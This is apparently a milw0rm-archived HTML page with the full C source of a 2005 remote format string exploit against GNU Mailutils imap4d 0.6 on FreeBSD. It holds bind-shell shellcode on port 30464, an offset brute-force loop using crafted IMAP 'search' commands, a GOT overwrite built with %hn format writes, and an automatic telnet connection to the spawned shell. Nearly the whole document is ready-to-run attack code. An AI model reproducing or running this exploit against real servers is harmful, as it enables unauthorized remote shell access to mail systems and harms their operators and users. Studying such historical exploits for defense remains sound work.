<html><head><title>GNU Mailutils imap4d 0.6 (search) Remote Format String Exploit (fbsd)</title></head><pre>/*
* Copyright (c) 2005 Rosiello Security
* http://www.rosiello.org
*
* Permission is granted for the redistribution of this software
* electronically. It may not be edited in any way without the express
* written consent of Rosiello Security.
*
* Disclaimer: The author published the information under the condition 
* that is not in the intention of the reader to use them in order to bring 
* to himself or others a profit or to bring to others damage.
*
* --------------------------------------------------------------------------
*
* GNU Mailutils 0.6 imap4d 'search' Format String Vulnerability
* iDEFENSE Security Advisory 09.09.05
* www.idefense.com/application/poi/display?id=303&amp;type=vulnerabilities
*
* The GNU mailutils package is a collection of mail-related
* utilities, including local and remote mailbox access services.
* More information is available at the following site:
* http://www.gnu.org/software/mailutils/mailutils.html
*
* This exploit shows the possibility to run arbitrary code
* on FreeBSD machines.
*
* Authors: Johnny Mast and Angelo Rosiello
* e-mails: rave@rosiello.org angelo@rosiello.org
*/

#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdarg.h&gt;


#define ISIP(m)   (!((int)inet_addr(m) ==-1))
#define clean(x)  memset(x, 0 , sizeof x)

char code[] =
&quot;\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90&quot;
&quot;\x31\xc0&quot;    /* xor %eax,%eax */
&quot;\x31\xc0&quot;    /* xor %eax,%eax */
&quot;\x50&quot;    /* push %eax */
&quot;\x31\xc0&quot;    /* xor %eax,%eax */
&quot;\x50&quot;    /* push %eax */
&quot;\xb0\x7e&quot;    /* mov $0x7e,%al */
&quot;\x50&quot;    /* push %eax */
&quot;\xcd\x80&quot;    /* int $0x80 */
&quot;\x31\xc0&quot;    /* xor %eax,%eax */

/* fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax
&quot;\x31\xdb&quot;                   // xorl    %ebx,%ebx
&quot;\x31\xc9&quot;                   // xorl    %ecx,%ecx
&quot;\x31\xd2&quot;                   // xorl    %edx,%edx
&quot;\xb0\x61&quot;                   // movb    $0x61,%al
&quot;\x51&quot;                       // pushl   %ecx 
&quot;\xb1\x06&quot;                   // movb    $0x6,%cl
&quot;\x51&quot;                       // pushl   %ecx
&quot;\xb1\x01&quot;                   // movb    $0x1,%cl   
&quot;\x51&quot;                       // pushl   %ecx
&quot;\xb1\x02&quot;                   // movb    $0x2,%cl
&quot;\x51&quot;                       // pushl   %ecx
&quot;\x8d\x0c\x24&quot;               // leal    (%esp),%ecx
&quot;\x51&quot;                       // pushl   %ecx
&quot;\xcd\x80&quot;                   // int     $0x80

/* it binds on port 30464 */
/* bind(fd, (struct sockaddr*)&amp;sin, sizeof(sin))  */
&quot;\xb1\x02&quot;                   // movb    $0x2,%cl
&quot;\x31\xc9&quot;                   // xorl    %ecx,%ecx
&quot;\x51&quot;                       // pushl   %ecx
&quot;\x51&quot;                       // pushl   %ecx 
&quot;\x51&quot;                       // pushl   %ecx

/* port = 0x77, change if needed */
&quot;\x80\xc1\x77&quot;               // addb    $0x77,%cl  
&quot;\x66\x51&quot;                   // pushw   %cx
&quot;\xb5\x02&quot;                   // movb    $0x2,%ch
&quot;\x66\x51&quot;                   // pushw   %cx 
&quot;\x8d\x0c\x24&quot;               // leal    (%esp),%ecx
&quot;\xb2\x10&quot;                   // movb    $0x10,%dl  
&quot;\x52&quot;                       // pushl   %edx
&quot;\x51&quot;                       // pushl   %ecx
&quot;\x50&quot;                       // pushl   %eax
&quot;\x8d\x0c\x24&quot;               // leal    (%esp),%ecx
&quot;\x51&quot;                       // pushl   %ecx 
&quot;\x89\xc2&quot;                   // movl    %eax,%edx
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax
&quot;\xb0\x68&quot;                   // movb    $0x68,%al
&quot;\xcd\x80&quot;                   // int     $0x80

/* listen(fd, 1)*/
&quot;\xb3\x01&quot;                   // movb    $0x1,%bl 
&quot;\x53&quot;                       // pushl   %ebx
&quot;\x52&quot;                       // pushl   %edx
&quot;\x8d\x0c\x24&quot;               // leal    (%esp),%ecx
&quot;\x51&quot;                       // pushl   %ecx
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax
&quot;\xb0\x6a&quot;                   // movb    $0x6a,%al
&quot;\xcd\x80&quot;                   // int     $0x80

/* cli = accept(fd, 0,0) */
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax  
&quot;\x50&quot;                       // pushl   %eax
&quot;\x50&quot;                       // pushl   %eax
&quot;\x52&quot;                       // pushl   %edx
&quot;\x8d\x0c\x24&quot;               // leal    (%esp),%ecx
&quot;\x51&quot;                       // pushl   %ecx
&quot;\x31\xc9&quot;                   // xorl    %ecx,%ecx
&quot;\xb0\x1e&quot;                   // movb    $0x1e,%al   
&quot;\xcd\x80&quot;                   // int     $0x80

/* dup2(cli,0) */
&quot;\x89\xc3&quot;                   // movl    %eax,%ebx
&quot;\x53&quot;                       // pushl   %ebx
&quot;\x51&quot;                       // pushl   %ecx
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax  
&quot;\xb0\x5a&quot;                   // movb    $0x5a,%al
&quot;\xcd\x80&quot;                   // int     $0x80

/* dup2(cli, 1) */
&quot;\x41&quot;                       // inc     %ecx
&quot;\x53&quot;                       // pushl   %ebx
&quot;\x51&quot;                       // pushl   %ecx
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax
&quot;\xb0\x5a&quot;                   // movb    $0x5a,%al
&quot;\xcd\x80&quot;                   // int     $0x80

/* dup2(cli, 2) */
&quot;\x41&quot;                       // inc     %ecx
&quot;\x53&quot;                       // pushl   %ebx
&quot;\x51&quot;                       // pushl   %ecx 
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax
&quot;\xb0\x5a&quot;                   // movb    $0x5a,%al
&quot;\xcd\x80&quot;                   // int     $0x80

/* execve(&quot;//bin/sh&quot;, [&quot;//bin/sh&quot;, NULL], NULL) */
&quot;\x31\xdb&quot;                   // xorl    %ebx,%ebx  
&quot;\x53&quot;                       // pushl   %ebx
&quot;\x68\x6e\x2f\x73\x68&quot;       // pushl   $0x68732f6e
&quot;\x68\x2f\x2f\x62\x69&quot;       // pushl   $0x69622f2f
&quot;\x89\xe3&quot;                   // movl    %esp,%ebx
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax
&quot;\x50&quot;                       // pushl   %eax
&quot;\x54&quot;                       // pushl   %esp
&quot;\x53&quot;                       // pushl   %ebx
&quot;\x50&quot;                       // pushl   %eax
&quot;\xb0\x3b&quot;                   // mov     $0x3b,%al
&quot;\xcd\x80&quot;                   // int     $0x80

/* exit(..)  */
&quot;\x31\xc0&quot;                   // xorl    %eax,%eax
&quot;\xb0\x01&quot;                   // mobv    $0x1,%al
&quot;\xcd\x80&quot;;                  // int     $0x80



void usage( int argc, char **argv )
{
 
  fprintf(stdout, &quot;%s usage:\n\n&quot;, argv[0]);
  fprintf(stdout, &quot;\t-h host\n&quot;);
  fprintf(stdout, &quot;\t-p port\n&quot;);
  fprintf(stdout, &quot;\t-l login\n&quot;);
  fprintf(stdout, &quot;\t-a password\n\n&quot;);

  return;
}


void send_message( int fd, char *msg, ... )
{
  char string[2000];
  int len;
  size_t size;

  va_list  args;


  clean(string);


  va_start(args, msg);
  len = vsnprintf(string, sizeof(string)-1, msg,args);
  len = (len &gt;=0) ? len : 0;

  /* Terminating the string */
  string[len]='\0';

  write(fd, string, len);

  return;
}





char *buildstring( long r_addr, long target, int offset, int sock )
{
  unsigned char string[512], a[4];
  int len;
  int high, low, arw;



  high = ( target &amp; 0xffff0000 ) &gt;&gt; 16;
  low =  ( target &amp; 0x0000ffff );

  clean(a); 
  a[0] = (r_addr &gt;&gt; 24) &amp; 0xff;
  a[1] = (r_addr &gt;&gt; 16) &amp; 0xff;
  a[2] = (r_addr &gt;&gt; 8) &amp; 0xff;
  a[3] = (r_addr) &amp; 0xff;
  a[4] = '\0';

  clean(string); 
  len = sprintf(string, &quot;3 search topic .%c%c%c%c%%.%dx%%%d$hn\n&quot;,
	(int)a[3]+2,a[2],a[1],a[0],
	high -(0x24+13),   	/* Number of bytes for the first write */
	offset	/* The Offset to addr */
        );

  len = (len &gt;=0) ? len : 0;
  string[len] = '\0';
  write(sock, string, len);

  read(sock, string, sizeof(string));


  clean(string);
  len = sprintf(string, &quot;3 search topic .%c%c%c%c%%.%dx%%%d$hn%s\n&quot;,
       (int) a[3], (int)a[2], (int)a[1],(int)a[0],
        low - (0x24 +13),
        offset,          /* The offset to addr +2 */
	code
        );

  len = (len &gt;=0) ? len : 0;
  string[len] = '\0';
  write(sock, string, len);


  return (char *)strdup(string);	
}


void get_addr_as_char( u_int addr, char *buf ) 
{
  *(u_int*)buf = addr;
  if (!buf[0]) buf[0]++;
  if (!buf[1]) buf[1]++;
  if (!buf[2]) buf[2]++;
  if (!buf[3]) buf[3]++;
}

static int got_entry = 0x08057a0c+4;


int comun( char *host, struct sockaddr_in sin4 )
{
  char *a[4] = { &quot;/usr/bin/telnet&quot;, host , &quot;30464&quot;, NULL };
  execve(a[0],a, NULL);
  return 0;
}

void welcome( )
{
  fprintf( stdout, &quot;\nCopyright (c) 2005 Rosiello Security\n&quot; );
  fprintf( stdout, &quot;http://www.rosiello.org\n&quot; );
  fprintf( stdout, &quot;imap4d Format String Exploiter for FreeBSD\n\n&quot; );
}

int main( int argc, char **argv )
{
  struct  hostent    *hp;
  struct sockaddr_in sin4;
  char shellbuf[1030];
  char *host, buffer[512], *ptr, *p, *USER, *PASS;
  int ch, port = 0, sock, offset = 1;
  int login  = 0, i, calc = 0;
  int ret = 0, len  = 0, b;
  int have_shell_loc = 0;
  unsigned int shell_addr = (u_int)0x0806c000;

  welcome( );

  if ( argc &lt; 9 )
  { 
    usage(argc, argv);
    exit(EXIT_SUCCESS);
  }

  if (!(host = malloc (128)))
  {
    fprintf(stderr, &quot;exp.c:115 Could not allocate memory\n&quot;);
    exit(EXIT_FAILURE);
  }


  while((ch = getopt(argc, argv, &quot;h:p:l:a:&quot;)) != EOF) 
  {
   switch(ch) 
   {
      case 'h':
      host = (char *)strdup(optarg);
      break;

      case 'V':
      break;

      case 'p':
      port =  atoi (optarg);
      break;
 
      case 'l':
      USER = (char *)optarg;
      break;

      case 'a':
      PASS = (char *)optarg;
      break;

      default:
      usage(argc, argv);
      break;
 }	
}


 
  if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0)
  {
    fprintf(stderr, &quot;exp.c:139 Error creating an new socket&quot;); 
    exit(EXIT_FAILURE);
  }

  host = (host) ? host : &quot;localhost&quot;;
  port = (port) ? port : 143;

  if (!(ISIP(host)))
  {
     if (!(hp = gethostbyname(host)))
     {
       fprintf(stderr, &quot;exp.c:152 Could not resolve ip address\n&quot;);	
       exit(EXIT_FAILURE);
     } 

     memcpy(&amp;sin4.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
     host = (char *)strdup(inet_ntoa(sin4.sin_addr)); 
  } else 
    sin4.sin_addr.s_addr = inet_addr(host);

 


  sin4.sin_family = AF_INET;
  sin4.sin_port = (unsigned short)htons( port );

  fprintf(stdout, &quot;[+] Connecting to %s:%d\n&quot;, host,port);

  if ((connect(sock, (struct sockaddr *)&amp;sin4,sizeof(struct sockaddr))) &lt; 0)
  { 
     fprintf(stderr, &quot;[*] exp.c:178 Connection failed\n&quot;);
     exit(EXIT_FAILURE);
  }


  fprintf(stdout, &quot;[+] Connected .. \n&quot;);
  fprintf(stdout, &quot;[+] Sending login ... \n&quot;);

  send_message(sock, &quot;1 LOGIN %s %s\r\n&quot;, USER, PASS);
  fprintf(stdout, &quot;[+] Done ... \n&quot;);

  while ((read(sock, buffer, 512)) &gt; 0)
  {
    if ( login == 0  &amp;&amp; ret == 0)
    switch (buffer[0])
    {

     case '1':
     fprintf(stdout, &quot;[+] Selecting inbox ..\n&quot;);
     send_message(sock, &quot;2 Select inbox\n&quot;);
     fprintf(stdout, &quot;[+] Selecting Done .. Starting brute sequence\n&quot;);
     send_message(sock, &quot;3 search topic .AAAABBBB%%%d$x\n&quot;,offset);
     login = 1;
     break;
    }


    if ((ptr=strstr(buffer, &quot;(near&quot;)) &amp;&amp; login == 1)
    {
      ptr +=15;
      if ((strncmp(ptr, &quot;41414141&quot;,8))!=0) 
      {
        offset ++;
        send_message(sock, &quot;3 search topic .AAAABBBB%%%d$x\n&quot;,offset);
      }
      else 
      {
        fprintf(stdout, &quot;[+] Found offset %d\n&quot;, offset);
	fprintf(stdout, &quot;[+] Finding buffer on the stack\n&quot;);
	ret = 1;
	login = 0;
        clean(buffer);
      }
    } 

    if ( ret == 1 )
    {
	
      if ((ptr=strstr(buffer, &quot;(near&quot;))) 
      {
        ptr +=6+4 +1; /* +4 for the addr string*/
	/* +1 for the junk char */
	calc = strlen(buffer) - strlen(ptr);
	calc -=6+4+1;	
	
	for (i = 0; i &lt; strlen(buffer); i++) 
        {  
           if ( (strncmp(ptr, code, strlen(code)))==0 &amp;&amp; have_shell_loc !=1)
           {
	     shell_addr += i -4;
	     have_shell_loc = 1;
	     sleep(2);
             buildstring(got_entry, shell_addr+=3, offset, sock);
             fprintf(stdout,&quot;[+] Decoy found at %p\n&quot;, shell_addr);
       	     close(sock);
	     fprintf(stdout, &quot;[+] Trying to contact the bind shell ..\n&quot;);
    	     if((comun(host, sin4)) &lt; 0)
	       fprintf(stderr, &quot;[-] Exploit failed\n&quot;);
           } 
           else
             ++ptr;
        } 
      }      
      if( shell_addr &gt; 0xc0000000)
        break;
      shell_addr++;
      ptr = ((char *)&amp;shell_addr);
      ptr[4] = 0;
      if ( strchr(ptr, 0xa) || strchr(ptr, 0xd) || ptr[0]==0x00) 
      {
        shell_addr ++;
        ptr = ((char *)&amp;shell_addr);
        ptr[4] = 0;
      } 
      while (strlen(ptr) !=4)
      {
        shell_addr++;
        ptr = ((char *)&amp;shell_addr);
        ptr[4] = 0;
      }
      if (have_shell_loc != 1)
      {
        send_message(sock, &quot;3 search topic .%s....%%%d$s%sCCCC\n&quot;,ptr,offset,code);
      }
    }
    clean(buffer);
  }

  fprintf(stderr, &quot;[+] Closing connection\n&quot;);
  close(sock);
  free(host);

  fprintf(stderr, &quot;[-] Exploit failed %p\n&quot;, shell_addr);
  return 0;
}

// milw0rm.com [2005-09-26]</pre></html>